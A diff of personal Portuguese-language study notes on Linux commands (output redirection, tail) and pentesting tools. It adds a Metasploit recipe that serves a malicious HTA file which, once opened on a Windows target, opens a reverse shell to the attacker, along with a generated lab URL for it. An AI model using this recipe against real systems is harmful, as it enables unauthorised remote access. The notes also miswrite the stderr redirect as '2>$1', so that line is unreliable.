@@ -19,6 +19,13 @@ Comando uteis
   whatis nome_comando -> fala o que o comando faz
   locate nome_do_programa_ou_arquivo -> busca um programa ou arquivo no sistema
   sudo updatedb -> atualiza o banco de dados para localizar mais arquivos
+  ls > texte.txt -> redireciona resultado do comando pra outro arquivo
+  ls >> texte.txt -> não sobrescreve o arquivo adicionar mais informações no mesmo
+  ls 2> texte.text -> redireciona a saida de erro
+  ls > texte.text 2>$1 -> redireciona pra outra saida
+  canal 0 (<) -> canal de entrada
+  canal 1 (>)-> canal saida padrão
+  canal 2 (>)-> canal saida de erro
 
 Visualizar arquviso 
   wc arquivo.txt -> Mostra numero de bits, numero de linhas, numero de palavra
@@ -30,6 +37,7 @@ Visualizar arquviso
   head -n 5 -> mostra so as 5 primeiras linhas
   tail -> mostra as 10 ultimas linhas do arquivo
   tail -n 5 -> mostra as 5 ultimas linhas
+  tail -f texte.txt -> fica mostrando alterações feitas no arquivo
   Funções do Less
     less nome_arquivo_texto
     seta pra cima e pra baixo move o texto
@@ -179,6 +187,17 @@ Metasploit
   services -> serviços que podem ser executados
   show options -> mostra as opções para o expoit
   session -> mostra as sessoes
+  HTA -> executavel no windows que obtem o acesso a maquina ao abrir o arquivo
+    use exploit/windows/misc/hta_server
+    set payload windows/shell/reverse_tcp
+    set srvport 8888
+    set lport 12345
+    run
+    depois do alvo ter executado -> ctrl + d pra sair do expoit
+      sessions
+      e começa a exploração
+
+http://192.168.100.71:8888/iNAndyBw8YqXQ.hta
 
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
